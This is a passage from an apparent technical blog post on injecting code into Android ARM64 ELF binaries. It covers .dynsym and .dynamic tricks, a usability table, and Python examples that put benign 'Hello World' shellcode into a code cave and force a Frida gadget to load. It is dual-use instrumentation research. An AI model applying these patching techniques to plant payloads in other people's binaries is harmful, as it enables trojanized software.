} &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (__predict_false(ELF_ST_BIND(s&lt;span style="color:#f92672">-&amp;gt;&lt;/span>st_info) &lt;span style="color:#f92672">!=&lt;/span> STB_LOCAL)) {
DL_WARN(&lt;span style="color:#e6db74">&amp;#34;Warning: unexpected ST_BIND value: %d for &lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74"> in &lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74"> (ignoring)&amp;#34;&lt;/span>,
ELF_ST_BIND(s&lt;span style="color:#f92672">-&amp;gt;&lt;/span>st_info), si&lt;span style="color:#f92672">-&amp;gt;&lt;/span>get_string(s&lt;span style="color:#f92672">-&amp;gt;&lt;/span>st_name), si&lt;span style="color:#f92672">-&amp;gt;&lt;/span>get_realpath());
}
&lt;span style="color:#66d9ef">return&lt;/span> false;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>This function has to return &lt;code>true&lt;/code> in order for our symbol to be returned by &lt;code>soinfo_do_lookup_impl&lt;/code>. Therefore, its binding must ensure that the symbol is globally available, i.e. either &lt;code>STB_GLOBAL&lt;/code> or &lt;code>STB_WEAK&lt;/code>, and the symbol has to be defined in relation to some section, whose index is not 0. (We have not talked about &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker_soinfo.cpp;l=184">symbol version checks&lt;/a> yet that introduce further complexity if there is a section of type &lt;code>SHT_VERSYM&lt;/code>. Note that &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker_soinfo.cpp;l=108">&lt;code>check_symbol_version&lt;/code>&lt;/a> also has to return &lt;code>true&lt;/code> for the symbol resolution to succeed.)&lt;/p>
&lt;p>Thus manipulating &lt;em>.dynsym&lt;/em> of an ELF - file is limited to the symbols that have a corresponding &lt;em>.gnu.hash&lt;/em> - entry.&lt;/p>
&lt;p>Combining the facts that the dynamic linker defaults to &lt;code>BIND_NOW&lt;/code> and uses hash tables like &lt;em>.gnu.hash&lt;/em> and &lt;em>.hash&lt;/em>, overwriting a &lt;em>.dynsym&lt;/em> - entry will be ignored and changes in e.g. &lt;em>.got.plt&lt;/em> will be overwritten, if there is no corresponding hash entry. Having lazy - binding would relax the situation a bit, as the symbol lookup would be delayed as much as possible, allowing further manipulations at runtime. &lt;code>BIND_NOW&lt;/code> enforces the existence of a hash table entry at startup in order for &lt;em>.dynsym&lt;/em> - based injection to work. Alternatively we could overwrite a relocation entry of type &lt;code>R_AARCH64_JUMP_SLOT&lt;/code>, which does not seem to require any other changes than in &lt;em>.rel(a).plt&lt;/em>.&lt;/p>
&lt;h3 id="dynamic---based-injection">&lt;em>.dynamic&lt;/em> - based Injection&lt;/h3>
&lt;p>Finally, the most common technique is described. This approach requires dynamic linking, i.e. if the target binary is statically linked and there is no &lt;em>.dynamic&lt;/em> - section, then this technique will &lt;strong>not&lt;/strong> work. Also we assume that all inserted &lt;em>.dynamic&lt;/em> - entries have the tag &lt;code>DT_NEEDED&lt;/code> to allow loading arbitrary shared object files. The corresponding &lt;code>d_val&lt;/code> is an offset into &lt;em>.dynstr&lt;/em>.&lt;/p>
&lt;p>The following subtechniques can be derived:&lt;/p>
&lt;ol>
&lt;li>Inserting a new &lt;em>.dynamic&lt;/em> - entry into &lt;em>.dynamic&lt;/em> and a new string into &lt;em>.dynstr&lt;/em>. Like in segment - based injection, this is the least intrusive and only reversible technique and is supported by LIEF. One issue is that it requires new memory to be inserted. E.g. on an ARM64 architecture with Android 12 (API level 31) and a NDK r23b build of a &amp;ldquo;Hello World&amp;rdquo; - application, &lt;em>.dynamic&lt;/em> is located between &lt;em>.plt&lt;/em> and &lt;em>.got&lt;/em>/&lt;em>.got.plt&lt;/em>. Therefore, inserting new memory will invalidate cross - references.&lt;/li>
&lt;li>Similar to the above, overwriting an existing &lt;em>.dynamic&lt;/em> - entry and inserting a new string results in a recomputation of all patchable references.&lt;/li>
&lt;li>Inserting a new &lt;em>.dynamic&lt;/em> - entry with a chosen string offset as &lt;code>d_val&lt;/code> requires to find a &amp;ldquo;suitable&amp;rdquo; substring in &lt;em>.dynstr&lt;/em>. Thinking of Frida, this substring should be of the form &amp;ldquo;substring.so&amp;rdquo;. This allows the use of configuration files for &lt;em>frida-gadget.so&lt;/em>.&lt;/li>
&lt;li>At last we can overwrite an existing &lt;em>.dynamic&lt;/em> - entry and use a &amp;ldquo;suitable&amp;rdquo; substring. Notice that some compilers (like e.g. gcc) like to generate a &lt;em>.dynamic&lt;/em> - entry with tag &lt;code>DT_DEBUG&lt;/code>. Its value is application - dependent. As this is marked as optional in System V gABI, it can be overwritten. If the application needs this &lt;em>.dynamic&lt;/em> - entry, then you will have to restore this entry in the initialisation function of your shared object file.&lt;/li>
&lt;/ol>
&lt;p>One main concern is that LIEF does not support using substrings. If LIEF sees that a &lt;em>.dynamic&lt;/em> - entry with tag &lt;code>DT_NEEDED&lt;/code> is inserted, it will insert a new string. Thus &lt;code>rawelf_injection&lt;/code> will be used for substring - related techniques. Also overwriting an existing &lt;em>.dynamic&lt;/em> - entry and inserting a new string is implemented by using the sequence&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">binary&lt;span style="color:#f92672">.&lt;/span>remove(binary&lt;span style="color:#f92672">.&lt;/span>dynamic_entries[index])
binary&lt;span style="color:#f92672">.&lt;/span>add_library(string)
&lt;/code>&lt;/pre>&lt;/div>&lt;p>If the &lt;em>.dynamic&lt;/em> - entry indexed by &lt;code>index&lt;/code> is e.g. a &lt;code>DT_NEEDED&lt;/code> - entry, then LIEF will also remove the corresponding string from &lt;em>.dynstr&lt;/em>. One must be cautious when removing &lt;em>.dynamic&lt;/em> - entries with LIEF.&lt;/p>
&lt;p>Lets consider a figure that describes the last subtechnique:
&lt;img src="https://lolcads.github.io/2022/07/technique_dynamic_override_substring.png" alt="Overwrite .dynamic entry with substring">&lt;/p>
&lt;h2 id="applicability">Applicability&lt;/h2>
&lt;p>Having seen all of those techniques, we should summarise what techniques are usable and under which circumstances. For that, please see the following table. The test environment is always on AMR64 and Android 12 (API level 31). Notice that we consider LIEF as a black - box and assume its correctness to be given.&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Technique&lt;/th>
&lt;th>Subtype&lt;/th>
&lt;th>Usable&lt;/th>
&lt;th>Constraints &amp;amp; Challenges&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Insert Memory&lt;/td>
&lt;td>-&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>&lt;code>adrp&lt;/code>, invalid cross - references, inserting memory after loadable with &lt;code>p_filesz=0&lt;/code>, permissions, overlapping loadables&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Code Caves&lt;/td>
&lt;td>Extension&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>segment permissions, &lt;code>adrp&lt;/code>, overlapping loadables&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>PHT Insert&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>Insert Memory issues, possibly order of loadables, &amp;hellip;&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>PHT Overwrite&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>finding &amp;ldquo;suitable&amp;rdquo; PHT - entry, &lt;code>adrp&lt;/code> because different &lt;code>p_memsz&lt;/code>, possibly order of loadables, &amp;hellip;&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Segments&lt;/td>
&lt;td>Inject(PHT)+Inject(Memory)&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>None, unless LIEF messes up&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>Overwrite+Overwrite&lt;/td>
&lt;td>Rather no&lt;/td>
&lt;td>finding &amp;ldquo;suitable&amp;rdquo; PHT - entry, finding &amp;ldquo;suitable&amp;rdquo; segment, &lt;code>adrp&lt;/code> because different &lt;code>p_memsz&lt;/code>, possibly order of loadables&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>Overwrite+Inject&lt;/td>
&lt;td>Rather yes&lt;/td>
&lt;td>Insert Memory issues, finding &amp;ldquo;suitable&amp;rdquo; PHT - entry, possibly order of loadables&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>Inject+Overwrite&lt;/td>
&lt;td>Rather no&lt;/td>
&lt;td>Insert Memory issues, finding &amp;ldquo;suitable&amp;rdquo; segment, possibly order of loadables&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Entry Point&lt;/td>
&lt;td>-&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>need virtual address&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;em>.dynsym&lt;/em>&lt;/td>
&lt;td>Insert Symbol&lt;/td>
&lt;td>No&lt;/td>
&lt;td>Dynamic Linker always uses &lt;code>BIND_NOW&lt;/code>, need specific hash table entries&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>Overwrite Symbol&lt;/td>
&lt;td>No&lt;/td>
&lt;td>Insert Symbol issues&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;em>.dynamic&lt;/em>&lt;/td>
&lt;td>Inject(.dynamic)+Inject(.dynstr)&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>None, unless LIEF messes up&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>Overwrite+Inject&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>None, unless LIEF messes up&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>Inject+Substring&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>finding &amp;ldquo;suitable&amp;rdquo; substring&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>Overwrite+Substring&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>finding &amp;ldquo;suitable&amp;rdquo; substring, finding &amp;ldquo;suitable&amp;rdquo; &lt;em>.dynamic&lt;/em> - entry&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>It is needless to say that overwriting vital structures like e.g. the ELF - header will completely break the binary. Always think about it twice when considering to overwrite something.&lt;/p>
&lt;p>All in all we can see that most techniques work. I must emphasize that the above &lt;strong>table is solely based on tests on a single platform for a single binary&lt;/strong>. Although theoretically correct, in practice many techniques can still fail due to bugs in the implementation on my side or deviations from specifications and standards on the vendor&amp;rsquo;s side. Also you should take the &amp;ldquo;Usable&amp;rdquo; - column with a grain of salt: it highly assumes that the user knows what he/she is doing. Blindly injecting memory will most likely result in segmentation faults.&lt;/p>
&lt;h2 id="practical-examples">Practical Examples&lt;/h2>
&lt;p>In this section we want to see whether these techniques can be used to make Frida work. Notice that for simplicity, we will only use &lt;em>.dynamic&lt;/em> - based injection to get Frida to run. This is justified by the fact that writing shellcode that is able to either track down &lt;code>dlopen&lt;/code> and thus libc or load a shared object file manually is non - trivial. To prove that other techniques work aswell I will provide shellcode that writes a plain &amp;ldquo;Hello World!&amp;rdquo; text to stdout and exits with code &lt;code>42&lt;/code>.&lt;/p>
&lt;h3 id="experiment-setup">Experiment Setup&lt;/h3>
&lt;p>In order to test the library, one may go ahead and create an Android Virtual Device (AVD) with API level 31 or above to support aarch64 - binaries (i.e. ARM64). Then run the emulator, e.g. via console&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">emulator -avd Pixel_3_API_31
&lt;/code>&lt;/pre>&lt;/div>&lt;p>where &lt;code>emulator&lt;/code> is a tool in the Android SDK. The name of the AVD may differ.&lt;/p>
&lt;p>Then use &lt;code>adb&lt;/code> to get a shell into the emulator using&lt;/p>
&lt;pre tabindex="0">&lt;code>adb shell
&lt;/code>&lt;/pre>&lt;p>This assumes that there is only one emulator running. Otherwise you need to specify the avd or its debug port.&lt;/p>
&lt;p>Finally, cross-compile a C program of your choice by utilising the Android NDK or take a binary that is a result of the &lt;em>Ahead-Of-Time&lt;/em> step of ART. Either way you should end up with an ELF - file. When cross - compiling a C program, use&lt;/p>
&lt;pre tabindex="0">&lt;code>adb push /path/to/binary /local/data/tmp/binary
&lt;/code>&lt;/pre>&lt;p>to get the binary into the emulator.&lt;/p>
&lt;p>As the python library only runs on AMD64, you should apply the techniques before pushing the ELF - file to the emulator.&lt;/p>
&lt;h3 id="hello-world---example">Hello World - Example&lt;/h3>
&lt;p>Lets use code cave - based injection. For simplicity, we assume that there is a code cave between loadable segments.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#import lief&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> ElfInjection.Binary &lt;span style="color:#f92672">import&lt;/span> ElfBinary
&lt;span style="color:#f92672">from&lt;/span> ElfInjection.CodeInjector &lt;span style="color:#f92672">import&lt;/span> ElfCodeInjector
&lt;span style="color:#f92672">from&lt;/span> ElfInjection.Seekers.CodeCaveSeeker &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>():
&lt;span style="color:#75715e"># 0. Introduce artificial code cave&lt;/span>
&lt;span style="color:#75715e">#binary = lief.parse(&amp;#39;./libs/arm64-v8a/hello&amp;#39;)&lt;/span>
&lt;span style="color:#75715e">#binary.add(binary.get(lief.ELF.SEGMENT_TYPES.LOAD))&lt;/span>
&lt;span style="color:#75715e">#binary.add(binary.get(lief.ELF.SEGMENT_TYPES.LOAD))&lt;/span>
&lt;span style="color:#75715e">#binary.write(&amp;#39;./libs/arm64-v8a/hello&amp;#39;)&lt;/span>
&lt;span style="color:#75715e"># 1. Setup variables&lt;/span>
shellcode &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x0e\xa9\x8c\xd2\x8e\x8d\xad\xf2\xee&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>
&lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\r\xc4\xf2\xee\xea\xed\xf2&lt;/span>&lt;span style="color:#e6db74">O&lt;/span>&lt;span style="color:#ae81ff">\x8e\x8d\xd2\x8f&lt;/span>&lt;span style="color:#e6db74">,&amp;#39;&lt;/span>
&lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\xa4\xf2&lt;/span>&lt;span style="color:#e6db74">O&lt;/span>&lt;span style="color:#ae81ff">\x01\xc0\xf2\xee&lt;/span>&lt;span style="color:#e6db74">?&lt;/span>&lt;span style="color:#ae81ff">\xbf\xa9&lt;/span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#ae81ff">\x00\x80&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>
&lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\xd2\xe1\x03\x00\x91\xa2\x01\x80\xd2\x08\x08&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>
&lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x80\xd2\x01\x00\x00\xd4&lt;/span>&lt;span style="color:#e6db74">@&lt;/span>&lt;span style="color:#ae81ff">\x05\x80\xd2\xa8\x0b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>
&lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x80\xd2\x01\x00\x00\xd4&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
&lt;span style="color:#75715e"># 2. Get the binary&lt;/span>
binary &lt;span style="color:#f92672">=&lt;/span> ElfBinary(&lt;span style="color:#e6db74">&amp;#39;./libs/arm64-v8a/hello&amp;#39;&lt;/span>)
injector &lt;span style="color:#f92672">=&lt;/span> ElfCodeInjector(binary)
&lt;span style="color:#75715e"># 3. Create cave seeker and search for caves of size&lt;/span>
&lt;span style="color:#75715e"># at least 0x100&lt;/span>
seeker &lt;span style="color:#f92672">=&lt;/span> ElfSegmentSeeker(&lt;span style="color:#ae81ff">0x100&lt;/span>)
caves &lt;span style="color:#f92672">=&lt;/span> injector&lt;span style="color:#f92672">.&lt;/span>findCodeCaves(seeker)
&lt;span style="color:#75715e"># 4. Find suitable code cave...&lt;/span>
cave &lt;span style="color:#f92672">=&lt;/span> caves[&lt;span style="color:#ae81ff">1&lt;/span>]
&lt;span style="color:#75715e"># 5. Adjust a loadable segment. This should also be executable!&lt;/span>
cave&lt;span style="color:#f92672">.&lt;/span>size &lt;span style="color:#f92672">=&lt;/span> len(shellcode)
sc, _ &lt;span style="color:#f92672">=&lt;/span> injector&lt;span style="color:#f92672">.&lt;/span>injectCodeCave(&lt;span style="color:#66d9ef">None&lt;/span>, cave, shellcode)
&lt;span style="color:#75715e"># 6. Overwrite entry point to point to whereever shellcode is&lt;/span>
old &lt;span style="color:#f92672">=&lt;/span> injector&lt;span style="color:#f92672">.&lt;/span>overwriteEntryPoint(sc&lt;span style="color:#f92672">.&lt;/span>vaddr)
&lt;span style="color:#75715e"># 7. Store to file&lt;/span>
binary&lt;span style="color:#f92672">.&lt;/span>store(&lt;span style="color:#e6db74">&amp;#39;./libs/arm64-v8a/tmp&amp;#39;&lt;/span>)
&lt;span style="color:#66d9ef">if&lt;/span> (__name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;__main__&amp;#39;&lt;/span>):
main()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The above code will search for a code cave that is at least &lt;code>0x100&lt;/code> bytes in size. Then it will select the second match, fill the cave with shellcode and set the entry point to point to the shellcode. Notice that the code cave will be appended to an executable segment. The target is the same binary as in the next example.&lt;/p>
&lt;p>Also notice that we need to artificially introduce two loadable, executable segments in order to find a code cave. If such an action is necessary to perform code cave based injection, you must reconsider whether code cave based injection is the correct choice.&lt;/p>
&lt;h3 id="dynamic---injection-example">&lt;em>.dynamic&lt;/em> - Injection Example&lt;/h3>
&lt;p>Finally, for &lt;em>.dynamic&lt;/em> - based injection please consider the following code:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> lief
&lt;span style="color:#f92672">from&lt;/span> ElfInjection.Binary &lt;span style="color:#f92672">import&lt;/span> ElfBinary
&lt;span style="color:#f92672">from&lt;/span> ElfInjection.CodeInjector &lt;span style="color:#f92672">import&lt;/span> ElfCodeInjector
&lt;span style="color:#f92672">from&lt;/span> ElfInjection.Manipulators.DynamicManipulator &lt;span style="color:#f92672">import&lt;/span> ElfDynamicOverwriter
&lt;span style="color:#f92672">from&lt;/span> ElfInjection.Manipulators.StringManipulator &lt;span style="color:#f92672">import&lt;/span> ElfStringFinder
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>():
&lt;span style="color:#75715e"># 1. Get the binary&lt;/span>
binary &lt;span style="color:#f92672">=&lt;/span> ElfBinary(&lt;span style="color:#e6db74">&amp;#39;./libs/arm64-v8a/hello&amp;#39;&lt;/span>)
injector &lt;span style="color:#f92672">=&lt;/span> ElfCodeInjector(binary)
&lt;span style="color:#75715e"># 2. Create overwriter&lt;/span>
dyn_overwriter &lt;span style="color:#f92672">=&lt;/span> ElfDynamicOverwriter(
tag&lt;span style="color:#f92672">=&lt;/span>lief&lt;span style="color:#f92672">.&lt;/span>ELF&lt;span style="color:#f92672">.&lt;/span>DYNAMIC_TAGS&lt;span style="color:#f92672">.&lt;/span>NEEDED,
value&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>,
index&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">6&lt;/span>
)
&lt;span style="color:#75715e"># 3. Create string finder&lt;/span>
str_finder &lt;span style="color:#f92672">=&lt;/span> ElfStringFinder()
&lt;span style="color:#75715e"># 4. Overwrite .dynamic entry with substring&lt;/span>
dyn_info &lt;span style="color:#f92672">=&lt;/span> injector&lt;span style="color:#f92672">.&lt;/span>injectDynamic(
str_finder,
dyn_overwriter
)
&lt;span style="color:#75715e"># 5. Store to file&lt;/span>
binary&lt;span style="color:#f92672">.&lt;/span>store(&lt;span style="color:#e6db74">&amp;#39;./libs/arm64-v8a/tmp&amp;#39;&lt;/span>)
&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;__main__&amp;#39;&lt;/span>:
main()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Because we are using an &lt;code>ElfStringFinder&lt;/code>, there is no user - supplied string injected into &lt;em>.dynstr&lt;/em>. Note that the user is responsible for providing the requested shared object file, e.g. by setting &lt;code>LD_LIBRARY_PATH&lt;/code>. We are manipulating the following program&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>()
{
&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>text &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Hello World!&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
&lt;span style="color:#66d9ef">while&lt;/span> (&lt;span style="color:#ae81ff">1&lt;/span>) {
write(&lt;span style="color:#ae81ff">1&lt;/span>, text, strlen(text));
sleep(&lt;span style="color:#ae81ff">1&lt;/span>);
}
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>compiled on AMD64, Ubuntu 20.04.1 LTS with Android NDK r23b&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ndk-build
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Investigating &lt;em>.dynamic&lt;/em> yields:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">readelf --wide --dynamic manipulated.bin
...
0x0000000000000001 &lt;span style="color:#f92672">(&lt;/span>NEEDED&lt;span style="color:#f92672">)&lt;/span> Shared library: &lt;span style="color:#f92672">[&lt;/span>libc.so&lt;span style="color:#f92672">]&lt;/span>
0x0000000000000001 &lt;span style="color:#f92672">(&lt;/span>NEEDED&lt;span style="color:#f92672">)&lt;/span> Shared library: &lt;span style="color:#f92672">[&lt;/span>libm.so&lt;span style="color:#f92672">]&lt;/span>
0x0000000000000001 &lt;span style="color:#f92672">(&lt;/span>NEEDED&lt;span style="color:#f92672">)&lt;/span> Shared library: &lt;span style="color:#f92672">[&lt;/span>libstdc++.so&lt;span style="color:#f92672">]&lt;/span>
0x0000000000000001 &lt;span style="color:#f92672">(&lt;/span>NEEDED&lt;span style="color:#f92672">)&lt;/span> Shared library: &lt;span style="color:#f92672">[&lt;/span>libdl.so&lt;span style="color:#f92672">]&lt;/span>
0x000000000000001e &lt;span style="color:#f92672">(&lt;/span>FLAGS&lt;span style="color:#f92672">)&lt;/span> BIND_NOW
0x000000006ffffffb &lt;span style="color:#f92672">(&lt;/span>FLAGS_1&lt;span style="color:#f92672">)&lt;/span> Flags: NOW PIE
0x0000000000000001 &lt;span style="color:#f92672">(&lt;/span>NEEDED&lt;span style="color:#f92672">)&lt;/span> Shared library: &lt;span style="color:#f92672">[&lt;/span>c.so&lt;span style="color:#f92672">]&lt;/span>
0x0000000000000007 &lt;span style="color:#f92672">(&lt;/span>RELA&lt;span style="color:#f92672">)&lt;/span> 0x1490
...
&lt;/code>&lt;/pre>&lt;/div>&lt;p>To see Frida in action, we first need to set the gadget&amp;rsquo;s bind address to an IP we can connect to (i.e. not localhost):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-json" data-lang="json">{
&lt;span style="color:#f92672">&amp;#34;interaction&amp;#34;&lt;/span>: {
&lt;span style="color:#f92672">&amp;#34;type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;listen&amp;#34;&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;address&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;&amp;lt;IP&amp;gt;&amp;#34;&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;port&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">27042&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;on_port_conflict&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;fail&amp;#34;&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;on_load&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;wait&amp;#34;&lt;/span>
}
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Name this file &amp;ldquo;c.config.so&amp;rdquo;.&lt;/p>
&lt;p>Now run the following in &lt;strong>separate&lt;/strong> shells to see Frida in action. The first shell should run something like this, setting up the test program.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">mv frida-gadget.so c.so
LD_LIBRARY_PATH&lt;span style="color:#f92672">=&lt;/span>. ./manipulated.bin
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And the second shell should do the tracing:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">frida-trace -H &amp;lt;IP&amp;gt;:27042 -n &lt;span style="color:#e6db74">&amp;#34;Gadget&amp;#34;&lt;/span> -i &lt;span style="color:#e6db74">&amp;#34;write&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="sources">Sources&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://cs.android.com/android">https://cs.android.com/android&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://frida.re">https://frida.re&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://frida.re/docs/gadget/">https://frida.re/docs/gadget/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/fkie-cad/ELFbin">https://github.com/fkie-cad/ELFbin&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/lief-project/LIEF">https://github.com/lief-project/LIEF&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://gitlab.com/x86-psABIs/x86-64-ABI">https://gitlab.com/x86-psABIs/x86-64-ABI&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://man7.org/linux/man-pages/man2/ptrace.2.html">https://man7.org/linux/man-pages/man2/ptrace.2.html&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://man7.org/linux/man-pages/man8/ld.so.8.html">https://man7.org/linux/man-pages/man8/ld.so.8.html&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://www.sco.com/developers/gabi/latest/contents.html">http://www.sco.com/developers/gabi/latest/contents.html&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://www.sco.com/developers/gabi/latest/ch4.reloc.html">http://www.sco.com/developers/gabi/latest/ch4.reloc.html&lt;/a>&lt;/li>
